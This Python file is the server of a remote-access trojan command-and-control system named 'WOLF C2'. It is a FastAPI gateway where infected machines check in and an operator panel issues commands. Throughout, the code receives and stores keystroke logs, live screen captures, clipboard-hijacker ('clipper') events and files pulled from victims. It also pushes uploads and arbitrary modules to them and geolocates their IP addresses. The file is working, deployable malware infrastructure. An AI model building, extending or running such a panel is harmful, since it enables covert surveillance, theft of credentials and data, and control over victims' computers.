"""WOLF C2 â€” FastAPI agent gateway + browser control panel.

Deploy target: Render (render.yaml at repo root).
One websocket per agent, one per panel. Binary frames = screen previews.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import os
import secrets
import sqlite3
import time
import urllib.request
import uuid
from pathlib import Path
from typing import Any

from fastapi import (Depends, FastAPI, File, Form, HTTPException, Request,
                     UploadFile, WebSocket, WebSocketDisconnect)
from fastapi.responses import (FileResponse, HTMLResponse, JSONResponse,
                               RedirectResponse, Response)
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

# --------------------------------------------------------------------------
# config
# --------------------------------------------------------------------------
BASE = Path(__file__).resolve().parent
DATA = Path(os.environ.get("DATA_DIR", str(BASE / "data")))
DATA.mkdir(parents=True, exist_ok=True)

PANEL_PASSWORD = os.environ.get("PANEL_PASSWORD", "")
if not PANEL_PASSWORD:
    PANEL_PASSWORD = secrets.token_urlsafe(9)
    print(f"[!] PANEL_PASSWORD unset -> generated: {PANEL_PASSWORD}", flush=True)

SECRET = (os.environ.get("SECRET_KEY") or secrets.token_hex(32)).encode()

AGENT_TOKEN = os.environ.get("AGENT_TOKEN", "")
if not AGENT_TOKEN:
    AGENT_TOKEN = secrets.token_urlsafe(24)
    print(f"[!] AGENT_TOKEN unset -> generated: {AGENT_TOKEN}", flush=True)

COOKIE = "wr_panel"
TTL = 7 * 24 * 3600
CHUNK = 256 * 1024
GEO = os.environ.get("GEO_LOOKUP", "1") != "0"

app = FastAPI(title="wr-c2", docs_url=None, redoc_url=None)
app.mount("/static", StaticFiles(directory=str(BASE / "static")), name="static")
templates = Jinja2Templates(directory=str(BASE / "templates"))


def asset(name: str) -> str:
    """Static URL with a stamp so a deploy can never pair new html with old js."""
    try:
        stamp = int((BASE / "static" / name).stat().st_mtime)
    except OSError:
        stamp = 1
    return f"/static/{name}?v={stamp}"


templates.env.globals["asset"] = asset


@app.middleware("http")
async def cache_headers(request: Request, call_next):
    resp = await call_next(request)
    path = request.url.path
    if path.startswith("/static/") and request.query_params.get("v"):
        resp.headers["Cache-Control"] = "public, max-age=31536000, immutable"
    elif path.startswith("/static/"):
        resp.headers["Cache-Control"] = "no-cache"
    else:
        resp.headers["Cache-Control"] = "no-store"
    return resp

# --------------------------------------------------------------------------
# storage
# --------------------------------------------------------------------------
SCHEMA = """
CREATE TABLE IF NOT EXISTS agents(
  id TEXT PRIMARY KEY, host TEXT, user TEXT, os TEXT, arch TEXT, pid INTEGER,
  admin INTEGER, ip TEXT, first_seen REAL, last_seen REAL, meta TEXT,
  country TEXT, cc TEXT, note TEXT, nickname TEXT, grp TEXT, pinned INTEGER DEFAULT 0
);
CREATE TABLE IF NOT EXISTS commands(
  id TEXT PRIMARY KEY, agent_id TEXT, module TEXT, args TEXT, created REAL,
  status TEXT, ok INTEGER, body TEXT
);
CREATE INDEX IF NOT EXISTS ix_cmd ON commands(agent_id, created DESC);
CREATE TABLE IF NOT EXISTS files(
  id TEXT PRIMARY KEY, agent_id TEXT, kind TEXT, path TEXT, name TEXT,
  size INTEGER, ts REAL, data BLOB
);
CREATE INDEX IF NOT EXISTS ix_files ON files(agent_id, ts DESC);
CREATE TABLE IF NOT EXISTS keylogs(
  id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, ts REAL, text TEXT
);
CREATE INDEX IF NOT EXISTS ix_keylog ON keylogs(agent_id, ts DESC);
"""


def db() -> sqlite3.Connection:
    con = sqlite3.connect(DATA / "c2.db", timeout=10)
    con.row_factory = sqlite3.Row
    con.execute("PRAGMA journal_mode=WAL")
    con.execute("PRAGMA synchronous=NORMAL")
    return con


with db() as _con:
    _con.executescript(SCHEMA)
    have = {r["name"] for r in _con.execute("PRAGMA table_info(agents)")}
    for col in ("meta", "country", "cc", "note", "nickname", "grp", "pinned"):
        if col not in have:
            _con.execute(f"ALTER TABLE agents ADD COLUMN {col} TEXT")
    _con.commit()


def q(sql: str, params: tuple = ()) -> list[dict]:
    with db() as con:
        return [dict(r) for r in con.execute(sql, params).fetchall()]


def x(sql: str, params: tuple = ()) -> None:
    with db() as con:
        con.execute(sql, params)
        con.commit()


# --------------------------------------------------------------------------
# session
# --------------------------------------------------------------------------
def sign(payload: str) -> str:
    mac = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()[:32]
    return f"{payload}.{mac}"


def verify(token: str | None) -> bool:
    if not token or "." not in token:
        return False
    payload, mac = token.rsplit(".", 1)
    want = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()[:32]
    if not hmac.compare_digest(mac, want):
        return False
    try:
        return int(payload.split("|")[1]) > time.time()
    except (IndexError, ValueError):
        return False


def require_panel(request: Request) -> None:
    if not verify(request.cookies.get(COOKIE)):
        raise HTTPException(status_code=401, detail="unauthorized")


def agent_ok(token: str | None) -> bool:
    return bool(token) and hmac.compare_digest(token, AGENT_TOKEN)


class AgentSession:
    def __init__(self, aid: str, ws: WebSocket):
        self.id = aid
        self.ws = ws
        self.queue: asyncio.Queue = asyncio.Queue()
        self.last_seen = time.time()
        self.info: dict = {}
        self.ping_ms = None
        self.preview: bytes | None = None
        self.preview_ts = 0.0
        self.frame_no = 0


LIVE: dict[str, AgentSession] = {}
PANELS: set[WebSocket] = set()
XFERS: dict[str, dict] = {}

# command id -> module, for silent/ws commands that never touch the DB
CMD_MODULE: dict[str, str] = {}


def remember(cid: str, module: str) -> None:
    if len(CMD_MODULE) > 4000:
        CMD_MODULE.clear()
    CMD_MODULE[cid] = module


async def pub(payload: dict) -> None:
    if not PANELS:
        return
    dead = []
    text = json.dumps(payload, separators=(",", ":"))
    for ws in list(PANELS):
        try:
            await ws.send_text(text)
        except Exception:
            dead.append(ws)
    for ws in dead:
        PANELS.discard(ws)


async def pub_frame(aid: str, jpeg: bytes) -> None:
    """Push the raw JPEG to every panel: 1 byte id length, id, jpeg."""
    if not PANELS:
        return
    head = aid.encode()[:255]
    packet = bytes((len(head),)) + head + jpeg
    dead = []
    for ws in list(PANELS):
        try:
            await ws.send_bytes(packet)
        except Exception:
            dead.append(ws)
    for ws in dead:
        PANELS.discard(ws)


def card(aid: str) -> dict | None:
    rows = q("SELECT * FROM agents WHERE id=?", (aid,))
    if not rows:
        return None
    row = rows[0]
    sess = LIVE.get(aid)
    meta = {}
    try:
        meta = json.loads(row.get("meta") or "{}")
    except Exception:
        pass
    return {
        "id": row["id"],
        "host": row["host"],
        "user": row["user"],
        "os": row["os"],
        "os_short": meta.get("os_short") or "",
        "arch": row["arch"],
        "pid": row["pid"],
        "admin": bool(row["admin"]),
        "ip": row["ip"],
        "cc": row.get("cc") or "",
        "country": row.get("country") or "",
        "nickname": row.get("nickname") or "",
        "grp": row.get("grp") or "",
        "note": row.get("note") or "",
        "pinned": bool(row.get("pinned")),
        "cpu": meta.get("cpu") or "",
        "ram": meta.get("ram") or 0,
        "gpu": meta.get("gpu") or "",
        "monitors": meta.get("monitors") or 1,
        "ver": meta.get("ver") or "",
        "tag": meta.get("tag") or "",
        "first_seen": row["first_seen"],
        "last_seen": row["last_seen"],
        "online": sess is not None,
        "ping": (round(sess.ping_ms, 1) if sess and sess.ping_ms is not None else None),
        "frame": sess.frame_no if sess else 0,
        "has_preview": bool(sess and sess.preview),
    }


# --------------------------------------------------------------------------
# pages
# --------------------------------------------------------------------------
@app.get("/health")
async def health():
    return {"ok": True, "agents": len(LIVE), "panels": len(PANELS), "ts": time.time()}


@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse(request=request, name="login.html", context={})


@app.post("/login")
async def login(request: Request, password: str = Form(...)):
    if not hmac.compare_digest(password, PANEL_PASSWORD):
        return RedirectResponse("/login?e=1", status_code=303)
    payload = f"panel|{int(time.time()) + TTL}"
    resp = RedirectResponse("/", status_code=303)
    resp.set_cookie(COOKIE, sign(payload), max_age=TTL, httponly=True,
                    samesite="lax", secure=request.url.scheme == "https")
    return resp


@app.get("/logout")
async def logout():
    resp = RedirectResponse("/login", status_code=303)
    resp.delete_cookie(COOKIE)
    return resp


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    if not verify(request.cookies.get(COOKIE)):
        return RedirectResponse("/login", status_code=303)
    return templates.TemplateResponse(request=request, name="index.html", context={})


# --------------------------------------------------------------------------
# panel api
# --------------------------------------------------------------------------
@app.get("/api/state", dependencies=[Depends(require_panel)])
async def api_state():
    rows = q("SELECT id FROM agents ORDER BY last_seen DESC")
    return {
        "agents": [c for c in (card(r["id"]) for r in rows) if c],
        "online": len(LIVE),
        "ts": time.time(),
    }


@app.get("/api/agents", dependencies=[Depends(require_panel)])
async def api_agents():
    rows = q("SELECT id FROM agents ORDER BY last_seen DESC")
    return {"agents": [c for c in (card(r["id"]) for r in rows) if c]}


@app.get("/api/agents/{aid}", dependencies=[Depends(require_panel)])
async def api_agent(aid: str):
    c = card(aid)
    if not c:
        raise HTTPException(404, "no such agent")
    return {
        "agent": c,
        "commands": q("SELECT * FROM commands WHERE agent_id=? ORDER BY created DESC LIMIT 150", (aid,)),
        "files": q("SELECT id,kind,path,name,size,ts FROM files WHERE agent_id=? ORDER BY ts DESC LIMIT 200", (aid,)),
        "keylogs": q("SELECT ts,text FROM keylogs WHERE agent_id=? ORDER BY id DESC LIMIT 400", (aid,)),
    }


@app.patch("/api/agents/{aid}/meta", dependencies=[Depends(require_panel)])
async def api_agent_meta(aid: str, body: dict):
    if not card(aid):
        raise HTTPException(404, "no such agent")
    fields = {}
    for key in ("nickname", "grp", "note"):
        if key in body:
            fields[key] = str(body.get(key) or "")[:200]
    if "pinned" in body:
        fields["pinned"] = 1 if body.get("pinned") else 0
    if not fields:
        raise HTTPException(400, "nothing to update")
    sets = ",".join(f"{k}=?" for k in fields)
    x(f"UPDATE agents SET {sets} WHERE id=?", (*fields.values(), aid))
    c = card(aid)
    await pub({"t": "agent", "agent": c})
    return {"ok": True, "agent": c}


@app.get("/api/agents/{aid}/preview.jpg", dependencies=[Depends(require_panel)])
async def api_preview(aid: str):
    sess = LIVE.get(aid)
    if not sess or not sess.preview:
        return Response(status_code=204)
    return Response(content=sess.preview, media_type="image/jpeg",
                    headers={"Cache-Control": "no-store"})


@app.post("/api/agents/{aid}/cmd", dependencies=[Depends(require_panel)])
async def api_cmd(aid: str, body: dict):
    sess = LIVE.get(aid)
    if not sess:
        raise HTTPException(409, "agent offline")
    module = str(body.get("module", ""))[:64]
    args = body.get("args") or {}
    silent = bool(body.get("silent"))
    if not module:
        raise HTTPException(400, "module required")
    cid = uuid.uuid4().hex
    if not silent:
        x("INSERT INTO commands(id,agent_id,module,args,created,status) VALUES(?,?,?,?,?,'queued')",
          (cid, aid, module, json.dumps(args), time.time()))
    else:
        remember(cid, module)
    await sess.queue.put({"type": "cmd", "id": cid, "module": module, "args": args})
    return {"id": cid, "silent": silent}


@app.get("/api/files/{fid}", dependencies=[Depends(require_panel)])
async def api_file(fid: str):
    rows = q("SELECT name,kind,path,data FROM files WHERE id=?", (fid,))
    if not rows:
        raise HTTPException(404, "missing")
    row = rows[0]
    name = row["name"] or "download.bin"
    ext = Path(name).suffix.lower()
    mime = {".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
            ".gif": "image/gif", ".wav": "audio/wav", ".mp3": "audio/mpeg",
            ".txt": "text/plain; charset=utf-8", ".json": "application/json",
            ".zip": "application/zip"}.get(ext, "application/octet-stream")
    return Response(content=row["data"], media_type=mime,
                    headers={"Content-Disposition": f'attachment; filename="{name}"'})


@app.delete("/api/files/{fid}", dependencies=[Depends(require_panel)])
async def api_file_delete(fid: str):
    x("DELETE FROM files WHERE id=?", (fid,))
    return {"ok": True}


@app.get("/api/agents/{aid}/keylogs", dependencies=[Depends(require_panel)])
async def api_keylogs(aid: str):
    return {"logs": q("SELECT ts,text FROM keylogs WHERE agent_id=? ORDER BY id ASC LIMIT 5000", (aid,))}


@app.delete("/api/agents/{aid}", dependencies=[Depends(require_panel)])
async def api_delete(aid: str, purge: bool = False):
    sess = LIVE.pop(aid, None)
    if sess:
        try:
            await sess.ws.close(code=1000)
        except Exception:
            pass
    if purge:
        for table in ("agents", "commands", "files", "keylogs"):
            x(f"DELETE FROM {table} WHERE id=?" if table == "agents" else f"DELETE FROM {table} WHERE agent_id=?",
              (aid,))
    await pub({"t": "agent", "agent": {"id": aid, "online": False, "removed": purge}})
    return {"ok": True}


@app.post("/api/agents/{aid}/upload", dependencies=[Depends(require_panel)])
async def api_upload(aid: str, path: str = Form(...), file: UploadFile = File(...)):
    sess = LIVE.get(aid)
    if not sess:
        raise HTTPException(409, "agent offline")
    blob = await file.read()
    tid = uuid.uuid4().hex
    total = max(1, (len(blob) + CHUNK - 1) // CHUNK)
    for i in range(total):
        part = blob[i * CHUNK:(i + 1) * CHUNK]
        cid = uuid.uuid4().hex
        args = {"path": path, "tid": tid, "seq": i, "total": total,
                "data": base64.b64encode(part).decode()}
        x("INSERT INTO commands(id,agent_id,module,args,created,status) VALUES(?,?,?,?,?,'queued')",
          (cid, aid, "upload", json.dumps(args), time.time()))
        await sess.queue.put({"type": "cmd", "id": cid, "module": "upload", "args": args})
        if total > 1:
            await pub({"t": "progress", "agent_id": aid, "xid": tid,
                       "pct": round((i + 1) * 100 / total), "kind": "upload"})
    return {"ok": True, "tid": tid, "chunks": total, "size": len(blob)}


# --------------------------------------------------------------------------
# panel socket
# --------------------------------------------------------------------------
@app.websocket("/panel/ws")
async def panel_ws(ws: WebSocket):
    if not verify(ws.cookies.get(COOKIE)):
        await ws.close(code=1008)
        return
    await ws.accept()
    PANELS.add(ws)
    try:
        await ws.send_text(json.dumps({"t": "hello", "ts": time.time()}))
        while True:
            raw = await ws.receive_text()
            try:
                msg = json.loads(raw)
            except Exception:
                continue
            if msg.get("t") != "ctl":
                continue
            sess = LIVE.get(str(msg.get("agent_id") or ""))
            module = str(msg.get("module") or "")[:64]
            if not sess or not module:
                continue
            args = msg.get("args") or {}
            if not isinstance(args, dict):
                args = {}
            cid = uuid.uuid4().hex
            remember(cid, module)
            await sess.queue.put({"type": "cmd", "id": cid, "module": module, "args": args})
    except (WebSocketDisconnect, Exception):
        pass
    finally:
        PANELS.discard(ws)
        if not PANELS:
            # nobody is watching: drop every agent back to the slow preview
            for sess in list(LIVE.values()):
                try:
                    await sess.queue.put({
                        "type": "cmd", "id": uuid.uuid4().hex, "module": "preview",
                        "args": {"action": "set", "interval_ms": 4000, "width": 640,
                                 "quality": 45, "paused": False},
                    })
                except Exception:
                    pass


# --------------------------------------------------------------------------
# agent socket
# --------------------------------------------------------------------------
@app.websocket("/ws")
async def agent_ws(ws: WebSocket):
    if not agent_ok(ws.headers.get("x-agent-token") or ws.query_params.get("t")):
        await ws.close(code=1008)
        return
    await ws.accept()

    sess: AgentSession | None = None
    send_task: asyncio.Task | None = None
    ping_task: asyncio.Task | None = None

    async def sender():
        assert sess
        while True:
            msg = await sess.queue.get()
            await ws.send_text(json.dumps(msg, separators=(",", ":")))

    async def pinger():
        assert sess
        while True:
            await asyncio.sleep(10)
            try:
                await ws.send_text(json.dumps({"type": "ping", "ts": time.perf_counter()}))
            except Exception:
                return

    try:
        while True:
            frame = await ws.receive()

            if frame.get("type") == "websocket.disconnect":
                break

            blob = frame.get("bytes")
            if blob is not None:
                if sess and blob[:2] == b"\xff\xd8":  # JPEG magic
                    sess.preview = blob
                    sess.preview_ts = time.time()
                    sess.frame_no += 1
                    await pub_frame(sess.id, blob)
                continue

            text = frame.get("text")
            if not text:
                continue
            msg = json.loads(text)
            kind = msg.get("type")

            if kind == "hello":
                aid = str(msg.get("agent_id") or uuid.uuid4().hex)[:64]
                if sess is None:
                    sess = AgentSession(aid, ws)
                    LIVE[aid] = sess
                    send_task = asyncio.create_task(sender())
                    ping_task = asyncio.create_task(pinger())
                sess.info = msg
                sess.last_seen = time.time()
                now = time.time()
                meta = {k: v for k, v in msg.items()
                        if k in ("os_short", "cpu", "ram", "gpu", "monitors", "ver", "tag", "domain")}
                ip = ws.client.host if ws.client else None
                x("""INSERT INTO agents(id,host,user,os,arch,pid,admin,ip,first_seen,last_seen,meta)
                     VALUES(?,?,?,?,?,?,?,?,?,?,?)
                     ON CONFLICT(id) DO UPDATE SET host=excluded.host,user=excluded.user,
                       os=excluded.os,arch=excluded.arch,pid=excluded.pid,admin=excluded.admin,
                       ip=excluded.ip,last_seen=excluded.last_seen,meta=excluded.meta""",
                  (aid, msg.get("host"), msg.get("user"), msg.get("os"), msg.get("arch"),
                   msg.get("pid") or 0, 1 if msg.get("admin") else 0, ip, now, now,
                   json.dumps(meta)))
                c = card(aid)
                if c:
                    await pub({"t": "agent", "agent": c})
                if GEO and ip:
                    asyncio.create_task(geo_lookup(aid, ip))

            elif kind == "pong":
                if sess:
                    sess.last_seen = time.time()
                    sent = msg.get("ts")
                    if isinstance(sent, (int, float)) and sent > 0:
                        rtt = (time.perf_counter() - sent) * 1000.0
                        if 0 <= rtt < 60000:
                            sess.ping_ms = rtt
                            await pub({"t": "ping", "agent_id": sess.id,
                                       "ms": round(rtt, 1)})

            elif kind == "result" and sess:
                cid = msg.get("id")
                body = msg.get("body") or {}
                x("UPDATE commands SET status='done', ok=?, body=? WHERE id=?",
                  (1 if body.get("ok") else 0, json.dumps(body), cid))
                module = ""
                row = q("SELECT module, args FROM commands WHERE id=?", (cid,))
                if row:
                    module = row[0]["module"]
                else:
                    module = CMD_MODULE.pop(cid, "")
                await pub({"t": "result", "agent_id": sess.id, "cmd_id": cid,
                           "module": module, "body": body})
                sess.last_seen = time.time()

            elif kind == "event" and sess:
                await handle_event(sess, msg)

    except WebSocketDisconnect:
        pass
    except Exception as exc:  # noqa: BLE001
        print("[ws] agent error:", exc, flush=True)
    finally:
        for task in (send_task, ping_task):
            if task:
                task.cancel()
        if sess and LIVE.get(sess.id) is sess:
            LIVE.pop(sess.id, None)
            x("UPDATE agents SET last_seen=? WHERE id=?", (time.time(), sess.id))
            await pub({"t": "agent", "agent": {"id": sess.id, "online": False}})


async def handle_event(sess: AgentSession, msg: dict) -> None:
    kind = msg.get("kind")

    if kind == "keylog":
        text = str(msg.get("data", ""))[:20000]
        if text:
            x("INSERT INTO keylogs(agent_id,ts,text) VALUES(?,?,?)", (sess.id, time.time(), text))
            await pub({"t": "keylog", "agent_id": sess.id, "text": text})

    elif kind == "log":
        await pub({"t": "log", "agent_id": sess.id, "text": str(msg.get("data", ""))[:2000]})

    elif kind == "clipper":
        await pub({"t": "log", "agent_id": sess.id,
                   "text": "[clipper] " + str(msg.get("data", ""))[:500]})

    elif kind == "progress":
        await pub({"t": "progress", "agent_id": sess.id,
                   "xid": msg.get("xfer"), "pct": msg.get("pct"), "kind": "transfer"})

    elif kind == "xfer:start":
        XFERS[f"{sess.id}:{msg.get('xfer')}"] = {
            "buf": bytearray(), "name": msg.get("name"),
            "meta": msg.get("meta") or {}, "total": int(msg.get("total") or 1),
        }
        await pub({"t": "progress", "agent_id": sess.id, "xid": msg.get("xfer"),
                   "pct": 0, "kind": "transfer", "name": msg.get("name"),
                   "size": msg.get("size")})

    elif kind == "xfer":
        key = f"{sess.id}:{msg.get('xfer')}"
        seq = int(msg.get("seq") or 0)
        total = int(msg.get("total") or 1)
        state = XFERS.setdefault(key, {"buf": bytearray(), "name": msg.get("name"),
                                       "meta": msg.get("meta") or {}, "total": total})
        try:
            state["buf"].extend(base64.b64decode(msg.get("data") or ""))
        except Exception:
            pass
        if total > 1:
            await pub({"t": "progress", "agent_id": sess.id, "xid": msg.get("xfer"),
                       "pct": round((seq + 1) * 100 / total), "kind": "transfer"})
        if seq + 1 >= total:
            XFERS.pop(key, None)
            meta = state["meta"] or {}
            fid = uuid.uuid4().hex
            name = (meta.get("name") or f"{state['name']}-{int(time.time())}.bin")[:200]
            path = (meta.get("path") or "")[:1000]
            data = bytes(state["buf"])
            x("INSERT INTO files(id,agent_id,kind,path,name,size,ts,data) VALUES(?,?,?,?,?,?,?,?)",
              (fid, sess.id, state["name"], path, name, len(data), time.time(), data))
            await pub({"t": "file", "agent_id": sess.id, "file": {
                "id": fid, "kind": state["name"], "name": name,
                "path": path, "size": len(data), "ts": time.time()}})


async def geo_lookup(aid: str, ip: str) -> None:
    if ip.startswith(("127.", "10.", "192.168.", "172.", "::1")):
        return
    try:
        def fetch() -> dict:
            req = urllib.request.Request(f"https://ipapi.co/{ip}/json/",
                                         headers={"User-Agent": "curl/8.5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                return json.loads(r.read().decode())

        d = await asyncio.to_thread(fetch)
        cc = (d.get("country_code") or "")[:4]
        name = (d.get("country_name") or "")[:64]
        if cc:
            x("UPDATE agents SET cc=?, country=? WHERE id=?", (cc, name, aid))
            c = card(aid)
            if c:
                await pub({"t": "agent", "agent": c})
    except Exception:
        pass

